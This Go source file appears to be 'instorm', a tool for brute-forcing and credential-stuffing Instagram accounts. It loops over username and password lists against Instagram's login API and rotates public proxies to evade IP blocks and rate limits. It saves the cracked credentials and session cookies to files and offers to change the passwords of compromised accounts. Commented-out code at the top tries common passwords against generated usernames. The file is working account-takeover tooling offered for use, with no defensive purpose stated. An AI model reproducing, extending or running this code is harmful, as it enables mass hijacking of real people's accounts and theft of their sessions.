package main

import (
	"bufio"
	"compress/gzip"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"os/user"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

var users []string = []string{}
var passwords []string = []string{}
var cracked []string = []string{}
var wrong []string = []string{}
var secure []string = []string{}
var instorm_log []string = []string{}
var cookies []string = []string{}
var passPath string
var userPath string
var crackPath string
var securePath string
var change_password_to string
var ThreadsPerMoment int
var cookiesPath string
var LoopFails bool
var SleepTime int = 0
var att int = 0
var InstaAPI API

var MyIP string = ""
var Proxy string = ""
var TotalUploadBandWidthInBytes float64
var TotalDownloadBandWidthInBytes float64

const KB float64 = 1000.0       // 10^3
const MB float64 = 1000000.0    // 10^6
const GB float64 = 1000000000.0 // 10^9

var ProxyCounter int = 0
var Proxies []string = []string{}
var HTTP []string = []string{}
var HTTPS []string = []string{}

var Wrongs int = 0
var Secureds int = 0
var Crackeds int = 0
var Fails int = 0
var counter int

var homeDict string = ""

func main() {

	// _, _, Proxies := GetProxies()

	// for i := 0; i < len(Proxies); i++ {

	// 	Proxy = Proxies[i]
	// 	println(Proxy)

	// 	req, _ := http.NewRequest("GET", "https://api.ipify.org?format=text", nil)
	// 	url_proxy := &url.URL{Host: Proxy}

	// 	// http.DefaultTransport = &http.Transport{Proxy: http.ProxyURL(url_proxy)}
	// 	// client := &http.Client{Timeout: time.Second * 60}

	// 	client := &http.Client{
	// 		Transport: &http.Transport{Proxy: http.ProxyURL(url_proxy)},
	// 		Timeout:   time.Second * 60,
	// 	}

	// 	resp, err := client.Do(req)
	// 	if err != nil {
	// 		println(err.Error())
	// 	} else {
	// 		var reader io.ReadCloser
	// 		switch resp.Header.Get("Content-Encoding") {
	// 		case "gzip":
	// 			reader, _ = gzip.NewReader(resp.Body)
	// 			defer reader.Close()
	// 		default:
	// 			reader = resp.Body
	// 		}
	// 		body, _ := ioutil.ReadAll(reader)
	// 		res := string(body)
	// 		println(res)
	// 		//break
	// 	}
	// }

	// time.Sleep(time.Second * 1)

	// //}

	// os.Exit(0)

	// passwords := []string{"1qazxsw2", "1qaz2wsx", "instagram123", "123password321"}

	// // for {
	// // 	us := GenerateRandomString(4, true, false, true, false, true)
	// // 	for i := 0; i < len(passwords); i++ {
	// // 		res := login(us, passwords[i], Proxy, true, InstaAPI)
	// // 		fmt.Println(us, passwords[i])
	// // 		fmt.Println(res.Body)
	// // 		time.Sleep(time.Second * 1)
	// // 		if strings.Contains(res.Body, "sentry_block") || strings.Contains(res.Body, "ip_block") || strings.Contains(res.Body, "wait") {
	// // 			if ProxyCounter == len(Proxies)-1 {
	// // 				HTTPS, HTTP, Proxies = GetProxies()
	// // 				ProxyCounter = 0
	// // 			}
	// // 			Proxy = Proxies[ProxyCounter]
	// // 			ProxyCounter++
	// // 			continue
	// // 		}
	// // 	}
	// // 	time.Sleep(time.Second * 5)

	// // }

	// list, _ := readLines("/Users/Ali/Documents/usernames/0.txt")
	// for n := 0; n < len(list); n++ {
	// 	for i := 0; i < len(passwords); i++ {
	// 		res := login(list[n], passwords[i], Proxy, true, InstaAPI)
	// 		fmt.Println(list[n], passwords[i])
	// 		fmt.Println(res.Body)
	// 		time.Sleep(time.Second * 1)
	// 		if strings.Contains(res.Body, "sentry_block") || strings.Contains(res.Body, "ip_block") || strings.Contains(res.Body, "wait") {
	// 			if ProxyCounter == 0 {
	// 				HTTPS, HTTP, Proxies = GetProxies()
	// 			}
	// 			if ProxyCounter == len(Proxies)-1 {
	// 				HTTPS, HTTP, Proxies = GetProxies()
	// 				ProxyCounter = 0
	// 			}
	// 			Proxy = Proxies[ProxyCounter]
	// 			ProxyCounter++
	// 			continue
	// 		}
	// 	}
	// 	time.Sleep(time.Second * 5)

	// }

	// Do it without threads!
	user, _ := user.Current()
	homeDict = user.HomeDir
	Start()

}

func progress() {

	for {

		TotalGBUploaded := fmt.Sprintf("%f", TotalUploadBandWidthInBytes/GB)
		TotalMBUploaded := fmt.Sprintf("%f", TotalUploadBandWidthInBytes/MB)
		TotalKBUploaded := fmt.Sprintf("%f", TotalUploadBandWidthInBytes/KB)
		TotalGBDownloaded := fmt.Sprintf("%f", TotalDownloadBandWidthInBytes/GB)
		TotalMBDownloaded := fmt.Sprintf("%f", TotalDownloadBandWidthInBytes/MB)
		TotalKBDownloaded := fmt.Sprintf("%f", TotalDownloadBandWidthInBytes/KB)

		TotalGB := fmt.Sprintf("%f", (TotalUploadBandWidthInBytes+TotalDownloadBandWidthInBytes)/GB)
		TotalMB := fmt.Sprintf("%f", (TotalUploadBandWidthInBytes+TotalDownloadBandWidthInBytes)/MB)
		TotalKB := fmt.Sprintf("%f", (TotalUploadBandWidthInBytes+TotalDownloadBandWidthInBytes)/KB)

		output := [10]string{}
		output[0] = fmt.Sprintf("\u001b[38;5;50m%s\u001b[0m \u001b[38;5;242m%s\u001b[0m", "Progress", "[")
		output[1] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Attempts", att)
		output[2] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Wrong attempts", len(wrong))
		output[3] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Secured accounts", len(secure))
		output[4] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Cracked account", len(cracked))
		output[5] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Fails attempts", Fails)
		output[6] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Total Upload BandWidth", TotalKBUploaded+" KB "+"- "+TotalMBUploaded+" MB "+"- "+TotalGBUploaded+" GB")
		output[7] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Total Download BandWidth", TotalKBDownloaded+" KB "+"- "+TotalMBDownloaded+" MB "+"- "+TotalGBDownloaded+" GB")
		output[8] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Total BandWidth", TotalKB+" KB "+"- "+TotalMB+" MB "+"- "+TotalGB+" GB")
		output[9] = fmt.Sprintf("\u001b[38;5;242m%s\u001b[0m", "]")

		for i := 0; i < len(output); i++ {
			fmt.Println(output[i])
		}

		time.Sleep(time.Millisecond * 500)

		for i := 0; i < len(output); i++ {
			print("\033[F")
			print("\033[K")
		}

	}

}

func Start() {

	//_InstaAPI, APIUploadBandWidth, APIDownloadBandWidth := GetAPI()
	_InstaAPI := GetAPI()
	APIUploadBandWidth := float64(0)
	APIDownloadBandWidth := float64(0)
	InstaAPI = _InstaAPI

	TotalUploadBandWidthInBytes += APIUploadBandWidth
	TotalDownloadBandWidthInBytes += APIDownloadBandWidth

	req, _ := http.NewRequest("GET", "https://api.ipify.org?format=text", nil)
	client := &http.Client{}

	ReqBytes, _ := httputil.DumpRequestOut(req, true)
	RequestSizeByBytes := float64(len(ReqBytes))
	TotalUploadBandWidthInBytes += RequestSizeByBytes

	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	ResBytes, _ := httputil.DumpResponse(resp, true)
	ResponseSizeByBytes := float64(len(ResBytes))
	TotalDownloadBandWidthInBytes += ResponseSizeByBytes

	var reader io.ReadCloser
	if resp.Header.Get("Content-Encoding") == "gzip" {
		reader, _ = gzip.NewReader(resp.Body)
		defer reader.Close()
	} else {
		reader = resp.Body
	}
	IP, err := ioutil.ReadAll(reader)
	if err != nil {
		panic(err)
	}
	MyIP = string(IP)

	HTTPS, HTTP, Proxies = GetProxies()

	var choice string

	R := color.New(color.FgRed, color.Bold)
	G := color.New(color.FgGreen)

	print("\033[H\033[2J")

	_, _ = R.Println("    _             __")
	_, _ = R.Println("   (_)____  _____/ /_____  _________ ___")
	_, _ = R.Println("  / // __ \\/ ___/ __/ __ \\/ ___/ __ `__ \\")
	_, _ = R.Println(" / // / / (__  ) /_/ /_/ / /  / / / / / /")
	_, _ = R.Println("/_//_/ /_/____/\\__/\\____/_/  /_/ /_/ /_/ ")

	_, _ = R.Println("")
	color.Blue("By BlackHole, inst: @ctpe")
	fmt.Println()

	_, _ = G.Print("Do you wanna set sleep time (Recommended) [y/n]: ")
	_, _ = fmt.Scanln(&choice)

	if strings.ToLower(choice) == "y" {
		print("\033[F")
		print("\033[K")
		for {
			var TPM string
			_, _ = G.Print("Enter the seconds you wnna sleep: ")
			_, _ = fmt.Scanln(&TPM)

			if _, err := strconv.Atoi(TPM); err == nil && TPM != "0" && !strings.Contains(TPM, "-") {
				_int64, _ := strconv.ParseInt(TPM, 0, 64)
				SleepTime = int(_int64)
				break
			} else {
				print("\033[F")
				print("\033[K")
				_, _ = R.Print("Enter a correct number\r")
				time.Sleep(time.Second * 1)
			}
		}
	} else {
		SleepTime = 0
	}

	for {
		var TPM string
		_, _ = G.Print("Enter a number of threads [best 1] (to avoid blocking :) ) : ")
		_, _ = fmt.Scanln(&TPM)

		if _, err := strconv.Atoi(TPM); err == nil && TPM != "0" && !strings.Contains(TPM, "-") {
			_int64, _ := strconv.ParseInt(TPM, 0, 64)
			ThreadsPerMoment = int(_int64)
			break
		} else {
			print("\033[F")
			print("\033[K")
			_, _ = R.Print("Enter a correct number\r")
			time.Sleep(time.Second * 1)
		}
	}

	for {
		_, _ = G.Print("Enter the path to the usernames list: " + homeDict + "/")
		_, _ = fmt.Scanln(&userPath)
		userPath = homeDict + "/" + userPath

		if userPath != homeDict+"/" && CheckPathToFile(userPath) {
			users, _ = readLines(userPath)
			if len(users) <= 0 {
				print("\033[F")
				print("\033[K")
				_, _ = R.Print("The list is empty\r")
				time.Sleep(time.Second * 1)
				continue
			}
			break
		} else {
			print("\033[F")
			print("\033[K")
			_, _ = R.Print("Enter a correct path\r")
			time.Sleep(time.Second * 1)
		}
	}

	for {
		_, _ = G.Print("Enter the path to the passwords list: " + homeDict + "/")
		_, _ = fmt.Scanln(&passPath)
		passPath = homeDict + "/" + passPath

		if passPath != homeDict+"/" && CheckPathToFile(passPath) {
			// passwords, _ = readLines(passPath)
			// if len(passwords) <= 0 {
			// 	print("\033[F")
			// 	print("\033[K")
			// 	_, _ = R.Print("The list is empty\r")
			// 	time.Sleep(time.Second * 1)
			// 	continue
			// }
			break
		} else {
			print("\033[F")
			print("\033[K")
			_, _ = R.Print("Enter a correct path\r")
			time.Sleep(time.Second * 1)
		}
	}

	for {
		_, _ = G.Print("Enter the cracked accounts file name: " + homeDict + "/")
		_, _ = fmt.Scanln(&crackPath)
		crackPath = homeDict + "/" + crackPath

		if crackPath != homeDict+"/" && CheckPathToFolder(crackPath) && crackPath != userPath && crackPath != passPath {
			break
		} else {
			print("\033[F")
			print("\033[K")
			_, _ = R.Print("Enter a correct path\r")
			time.Sleep(time.Second * 1)
		}
	}

	_, _ = G.Print("Do you wanna change the password of each cracked account's [y/n]: ")
	_, _ = fmt.Scanln(&choice)

	if strings.ToLower(choice) == "y" {
		print("\033[F")
		print("\033[K")
		for {
			_, _ = G.Print("Enter the new passowrd: ")
			_, _ = fmt.Scan(&change_password_to)
			if !CheckPassword(change_password_to, 8) {
				print("\033[F")
				print("\033[K")
				_, _ = R.Print("Enter a harder password\r")
				time.Sleep(time.Second * 2)
			} else {
				break
			}
		}
	} else {
		change_password_to = ""
	}

	_, _ = G.Print("Do you wanna save the secured accounts [y/n]: ")
	_, _ = fmt.Scanln(&choice)

	if strings.ToLower(choice) == "y" {
		print("\033[F")
		print("\033[K")
		for {
			_, _ = G.Print("Enter the secured accounts file name: " + homeDict + "/")
			_, _ = fmt.Scanln(&securePath)
			securePath = homeDict + "/" + securePath

			if securePath != homeDict+"/" && CheckPathToFolder(securePath) && securePath != userPath && securePath != passPath && securePath != crackPath {
				break
			} else {
				print("\033[F")
				print("\033[K")
				_, _ = R.Print("Enter a correct path\r")
				time.Sleep(time.Second * 1)
			}
		}
	} else {
		securePath = ""
	}

	_, _ = G.Print("Do you wanna save the cookies of each account [y/n]: ")
	_, _ = fmt.Scanln(&choice)

	if strings.ToLower(choice) == "y" {
		print("\033[F")
		print("\033[K")
		for {
			_, _ = G.Print("Enter the cookies file name: " + homeDict + "/")
			_, _ = fmt.Scanln(&cookiesPath)
			cookiesPath = homeDict + "/" + cookiesPath

			if cookiesPath != homeDict+"/" && CheckPathToFolder(cookiesPath) && cookiesPath != userPath && cookiesPath != passPath && cookiesPath != crackPath && cookiesPath != securePath {
				break
			} else {
				print("\033[F")
				print("\033[K")
				_, _ = R.Print("Enter a correct path\r")
				time.Sleep(time.Second * 1)
			}
		}
	} else {
		cookiesPath = ""
	}

	_, _ = G.Print("If the login process failed (By network, block, etc...) do u wnna repeat it [y/n]: ")
	_, _ = fmt.Scanln(&choice)

	if strings.ToLower(choice) == "y" {
		print("\033[F")
		print("\033[K")
		LoopFails = true
	} else {
		LoopFails = false
	}

	print("\033[H\033[2J")

	_, _ = R.Println("    _             __")
	_, _ = R.Println("   (_)____  _____/ /_____  _________ ___")
	_, _ = R.Println("  / // __ \\/ ___/ __/ __ \\/ ___/ __ `__ \\")
	_, _ = R.Println(" / // / / (__  ) /_/ /_/ / /  / / / / / /")
	_, _ = R.Println("/_//_/ /_/____/\\__/\\____/_/  /_/ /_/ /_/ ")

	_, _ = R.Println("")
	color.Blue("By BlackHole, inst: @ctpe")
	fmt.Println()

	go func() {
		progress()
	}()

	process()

	print("\033[H\033[2J")

	_, _ = R.Println("    _             __")
	_, _ = R.Println("   (_)____  _____/ /_____  _________ ___")
	_, _ = R.Println("  / // __ \\/ ___/ __/ __ \\/ ___/ __ `__ \\")
	_, _ = R.Println(" / // / / (__  ) /_/ /_/ / /  / / / / / /")
	_, _ = R.Println("/_//_/ /_/____/\\__/\\____/_/  /_/ /_/ /_/ ")

	_, _ = R.Println("")
	color.Blue("By BlackHole, inst: @ctpe")
	fmt.Println()

	_, _ = G.Println("For any bug, just contact me at instagram @ctpe,")
	_, _ = G.Println("Thank you for using instorm, and I hope you have a nice day :)")

}

var Blocked = false

func Check(us string) {
	if counter >= len(users) {
		return
	}
	counter++

	file, _ := os.Open(passPath)
	scanner := bufio.NewScanner(file)

	done := false

	for scanner.Scan() { //for i := 0; i < len(passwords); i++ {
		belong := 0
		for {
			// Check Proxy
			if Blocked {
				for {

					req, _ := http.NewRequest("GET", "https://api.ipify.org?format=text", nil)
					url_proxy := &url.URL{Host: Proxy}
					client := &http.Client{
						Transport: &http.Transport{Proxy: http.ProxyURL(url_proxy)},
						Timeout:   time.Second * 10,
					}

					ReqBytes, _ := httputil.DumpRequestOut(req, true)
					RequestSizeByBytes := float64(len(ReqBytes))
					TotalUploadBandWidthInBytes += RequestSizeByBytes

					resp, err := client.Do(req)
					if err != nil {
						if ProxyCounter == len(Proxies)-1 {
							HTTPS, HTTP, Proxies = GetProxies()
							ProxyCounter = 0
						}
						Proxy = Proxies[ProxyCounter]
						ProxyCounter++
						continue
					}

					ResBytes, _ := httputil.DumpResponse(resp, true)
					ResponseSizeByBytes := float64(len(ResBytes))
					TotalDownloadBandWidthInBytes += ResponseSizeByBytes

					defer resp.Body.Close()
					body, err := ioutil.ReadAll(resp.Body)
					_body := string(body)
					IP := strings.Split(Proxy, ":")[0]
					if err != nil && IP != _body {
						if ProxyCounter == len(Proxies)-1 {
							HTTPS, HTTP, Proxies = GetProxies()
							ProxyCounter = 0
						}
						Proxy = Proxies[ProxyCounter]
						ProxyCounter++
						continue
					}
					break
				}
			}
			//
			res := login(us, scanner.Text(), Proxy, true, InstaAPI, 15000)
			att++
			TotalUploadBandWidthInBytes += res.RequestSizeByBytes
			TotalDownloadBandWidthInBytes += res.ResponseSizeByBytes

			currentTime := time.Now().Format("2006-01-02 15:04:05 PM Monday")

			if Proxy != "" {
				instorm_log = append(instorm_log,
					"Attempt #"+fmt.Sprintf("%v", att)+"\n"+
						"------------------------------------------------"+"\n"+
						"Time & Date: "+currentTime+"\n"+
						"Wrongs: "+fmt.Sprintf("%v", len(wrong))+"\n"+
						"Cracked: "+fmt.Sprintf("%v", len(cracked))+"\n"+
						"Secured: "+fmt.Sprintf("%v", len(secure))+"\n"+
						"fails: "+fmt.Sprintf("%v", Fails)+"\n"+
						"username: "+us+"\n"+
						"password: "+scanner.Text()+"\n"+
						"Response: "+res.Body+"\n"+
						"error: "+res.Err+"\n"+
						"Proxy: "+Proxy+"\n"+
						"------------------------------------------------"+"\n")
			} else {
				instorm_log = append(instorm_log,
					"Attempt #"+fmt.Sprintf("%v", att)+"\n"+
						"------------------------------------------------"+"\n"+
						"Time & Date: "+currentTime+"\n"+
						"Wrongs: "+fmt.Sprintf("%v", len(wrong))+"\n"+
						"Cracked: "+fmt.Sprintf("%v", len(cracked))+"\n"+
						"Secured: "+fmt.Sprintf("%v", len(secure))+"\n"+
						"fails: "+fmt.Sprintf("%v", Fails)+"\n"+
						"username: "+us+"\n"+
						"password: "+scanner.Text()+"\n"+
						"Response: "+res.Body+"\n"+
						"error: "+res.Err+"\n"+
						"------------------------------------------------"+"\n")
			}
			_ = writeLines(instorm_log, homeDict+"/"+"instorm_log")
			if !strings.Contains(res.Body, "sentry_block") && !strings.Contains(res.Body, "ip_block") && !strings.Contains(res.Body, "Please wait") {
				Blocked = false
			}
			if strings.Contains(res.Body, "logged_in_user") {
				done = true
				_url, _ := url.Parse("https://i.instagram.com/api/v1/accounts/login/")
				var cokkies = res.Cookies.Cookies(_url)
				var sessionid string
				_ = sessionid
				for i := 0; i < len(cokkies); i++ {
					if strings.Contains(strings.ToLower(cokkies[i].Name), "session") && strings.Contains(strings.ToLower(cokkies[i].Name), "id") {
						sessionid = cokkies[i].Value
					}
				}

				if cookiesPath != "" {
					if !ssliceContains(cookies, us) && us != "" {
						cookies = append(cookies, us+":"+scanner.Text()+":"+sessionid)
					}
					_ = writeLines(cookies, cookiesPath)
				}

				if !ssliceContains(cracked, us) && us != "" {
					cracked = append(cracked, us+":"+scanner.Text())
				}

				if crackPath != "" {
					_ = writeLines(cracked, crackPath)
				}

				if change_password_to != "" {
					//change password
				}

			} else if strings.Contains(res.Body, "secure") || strings.Contains(res.Body, "unusable_password") ||
				strings.Contains(res.Body, "checkpoint_challenge_required") || strings.Contains(res.Body, "challenge_required") {
				if !ssliceContains(secure, us) && us != "" {
					secure = append(secure, us+":"+scanner.Text())
				}
				if securePath != "" {
					_ = writeLines(secure, securePath)
				}
			} else if strings.Contains(res.Body, "bad_password") || strings.Contains(res.Body, "invalid_user") {
				if !ssliceContains(wrong, us) && us != "" {
					wrong = append(wrong, us+":"+scanner.Text())
				}
			} else if strings.Contains(res.Body, "Oops, an error occurred.") {
				if LoopFails {
					time.Sleep(time.Millisecond * 10000)
					continue
				} else {
					Fails++
					continue
				}
			} else if (strings.Contains(res.Body, "belong to an account") && !strings.Contains(res.Body, "ip_block")) || strings.Contains(res.Body, "Please wait") || res.Body == "" {
				if LoopFails {
					time.Sleep(time.Millisecond * 10000)
					belong++
					if res.Body == "" && !(belong > 3) {
						time.Sleep(time.Millisecond * 5000) //temporary
						continue
					}
					if belong > 3 {
						Blocked = true
						if ProxyCounter == len(Proxies)-1 {
							HTTPS, HTTP, Proxies = GetProxies()
							ProxyCounter = 0
						}
						Proxy = Proxies[ProxyCounter]
						ProxyCounter++
						belong = 0
					}
					continue
				} else {
					belong++
					if res.Body == "" && !(belong > 3) {
						time.Sleep(time.Millisecond * 5000) //temporary
						continue
					}
					belong = 0
					Blocked = true
					if ProxyCounter == len(Proxies)-1 {
						HTTPS, HTTP, Proxies = GetProxies()
						ProxyCounter = 0
					}
					Proxy = Proxies[ProxyCounter]
					ProxyCounter++
					belong = 0
					continue
				}
			} else if strings.Contains(res.Body, "ip_block") || strings.Contains(res.Body, "sentry_block") {
				Blocked = true
				if ProxyCounter == len(Proxies)-1 {
					HTTPS, HTTP, Proxies = GetProxies()
					ProxyCounter = 0
				}
				Proxy = Proxies[ProxyCounter]
				ProxyCounter++
				continue
			} else {
				if LoopFails {
					time.Sleep(time.Millisecond * 10000)
					belong++
					if res.Body == "" && res.Err != "null" {
						time.Sleep(time.Millisecond * 5000) //temporary
						continue
					}
					if belong > 3 {
						Blocked = true
						if ProxyCounter == len(Proxies)-1 {
							HTTPS, HTTP, Proxies = GetProxies()
							ProxyCounter = 0
						}
						Proxy = Proxies[ProxyCounter]
						ProxyCounter++
						belong = 0
					}
					continue
				} else {
					Fails++
					continue
				}
			}
			if SleepTime != 0 {
				rands := RandRange(0, 3)
				time.Sleep(time.Second * time.Duration(SleepTime+rands))
			}
			break

		}
		if done {
			break
		}
	}
	file.Close()
	// if SleepTime != 0 {
	// 	time.Sleep(time.Second * time.Duration(SleepTime))
	// }
}

func process() {
	Attempts := (len(users) / ThreadsPerMoment) + (len(users) % ThreadsPerMoment)
	for i := 0; i < Attempts; i++ {
		wg := sync.WaitGroup{}
		for z := 0; z < ThreadsPerMoment; z++ {
			if counter >= len(users) {
				return
			}
			wg.Add(1)
			go func() {
				defer wg.Done()
				Check(users[counter])
			}()
		}
		wg.Wait()
		if (len(users) - counter) < ThreadsPerMoment {
			ThreadsPerMoment = len(users) - counter
		}
	}
}

func CheckPassword(password string, level int) bool {
	if password == "" {
		return false
	}
	if level <= 0 {
		return false
	}
	runes := uniqueString([]rune(password))
	str := string(runes)
	if len(str) < level {
		return false
	}
	return true
}

func uniqueNumber(intSlice []int) []int {
	keys := make(map[int]bool)
	list := []int{}
	for _, entry := range intSlice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

func uniqueStringList(intSlice []string) []string {
	keys := make(map[string]bool)
	list := []string{}
	for _, entry := range intSlice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

func uniqueString(intSlice []rune) []rune {
	keys := make(map[rune]bool)
	list := []rune{}
	for _, entry := range intSlice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

func remove(s []string, n int) []string {
	_s := []string{}
	for i := 0; i < len(s); i++ {
		if i != n {
			_s = append(_s, s[i])
		}
	}
	return _s
}

func CheckPathToFolder(path string) bool {
	if string(path[len(path)-1]) == "/" {
		return false
	}

	list := strings.Split(path, "/")
	removed := remove(list, 0)

	_path := (remove(removed, len(removed)-1))
	current := ""

	for i := 0; i < len(_path); i++ {
		if i == 0 {
			current = "/" + _path[i] + "/"
			continue
		}
		current += _path[i] + "/"
	}

	_, err := os.Open(path)
	if err != nil {
		file, err := os.Open(current)
		if err != nil {
			return false
		}
		fi, err := file.Stat()
		if err != nil {
			return false
		}
		if fi.IsDir() {
			return true
		}
	}
	return false
}

func CheckPathToFile(path string) bool {

	file, err := os.Open(path)
	if err != nil {
		return false
	}
	fi, err := file.Stat()
	if err != nil {
		return false
	}
	if fi.IsDir() {
		return false
	} else {
		return true
	}

}
